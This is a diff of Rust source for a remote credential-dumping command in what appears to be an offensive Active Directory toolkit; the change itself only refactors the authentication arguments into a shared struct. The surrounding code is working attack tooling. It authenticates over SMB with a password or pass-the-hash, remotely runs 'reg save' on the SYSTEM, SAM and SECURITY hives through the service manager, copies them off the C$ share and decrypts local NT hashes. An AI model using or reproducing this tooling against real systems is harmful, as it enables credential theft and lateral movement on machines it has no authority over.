@@ -7,17 +7,8 @@ use clap::Parser;
 
 #[derive(Parser)]
 pub(crate) struct SecretsdumpArgs {
-    /// Target host or IP
-    #[arg(long)]
-    pub host: String,
-    /// NetBIOS or DNS domain
-    #[arg(long)]
-    pub domain: String,
-    /// Username (needs local admin on the target)
-    #[arg(long)]
-    pub user: String,
-    #[arg(long, default_value = "")]
-    pub password: String,
+    #[command(flatten)]
+    pub auth: crate::shared_args::SmbAuth,
     /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
     #[arg(long)]
     pub nt_hash: Option<String>,
@@ -26,19 +17,20 @@ pub(crate) struct SecretsdumpArgs {
 /// Local secretsdump: run `reg save` for SYSTEM + SAM as LocalSystem, pull the hives over C$,
 /// then decrypt the local account NT hashes offline (bootkey → SAM key → per-user).
 pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
-    a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
+    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
     use smb2_client::SmbClient;
-    let mut smb = SmbClient::connect(&a.host).await?;
+    let mut smb = SmbClient::connect(&a.auth.host).await?;
     crate::smb_login(
         &mut smb,
-        &a.host,
-        &a.domain,
-        &a.user,
-        &a.password,
+        &a.auth.host,
+        &a.auth.domain,
+        &a.auth.user,
+        &a.auth.password,
         &a.nt_hash,
     )
     .await?;
-    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+    smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
+        .await?;
 
     // Fast path: pull the bootkey directly via MS-RRP (WINREG API). Four tiny RPC
     // roundtrips for the Lsa\{JD,Skew1,GBG,Data} key CLASS NAMES — no `reg save HKLM\SYSTEM`,
@@ -51,10 +43,10 @@ pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
     let bootkey_rrp = {
         let mut reg = match dcerpc::rrp::RegistryClient::connect(
             &mut smb,
-            &a.domain,
-            &a.user,
-            &a.password,
-            &a.host,
+            &a.auth.domain,
+            &a.auth.user,
+            &a.auth.password,
+            &a.auth.host,
         )
         .await
         {
@@ -135,7 +127,8 @@ pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
         hives.push(("SECURITY", sec_rel));
     }
     for (hive, rel) in &hives {
-        smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+        smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
+            .await?;
         let cmd = format!("reg save HKLM\\{hive} C:\\{rel} /y");
         let ret = dcerpc::svcctl::run(&mut smb, &cmd).await?;
         tracing::info!("reg save {hive}: SCM start win32 {ret}");
@@ -144,7 +137,8 @@ pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
     let (system, sam, security) = if hives.is_empty() {
         (None, None, None)
     } else {
-        smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
+        smb.tree_connect(&format!("\\\\{}\\C$", a.auth.host))
+            .await?;
         let sys = if want_system {
             Some(
                 smb.read_file_delete(sys_rel)
